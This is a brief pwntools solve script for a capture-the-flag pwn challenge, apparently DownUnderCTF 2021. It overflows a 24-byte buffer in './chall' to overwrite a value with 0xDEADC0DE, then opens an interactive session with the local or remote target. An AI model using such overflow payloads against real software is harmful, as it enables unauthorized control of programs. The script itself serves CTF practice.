# -- coding: utf-8 --
from pwn import *

# ENV
PORT = 31916 
HOST = "pwn-2021.duc.tf"
e = context.binary = ELF('./chall')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
pause()


# VARIABLE


# PAYLOAD
payload  = 'a' * 24
payload += p64(0xDEADC0DE)



r.sendlineafter('', payload)


r.interactive()